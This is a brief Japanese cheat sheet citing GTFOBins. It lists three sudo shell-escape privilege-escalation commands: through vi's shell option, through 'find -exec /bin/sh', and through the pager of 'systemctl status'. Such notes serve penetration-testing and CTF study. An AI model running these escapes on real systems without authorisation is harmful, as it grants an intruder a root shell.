参考  
https://gtfobins.github.io/  

```bash
# viの悪用
:set shell=/bin/sh
:shell
# findの悪用
sudo find . -exec /bin/sh \; -quit
# systemctlとpagerの悪用
sudo systemctl status <サービス>
- (press RETURN)!sh
```
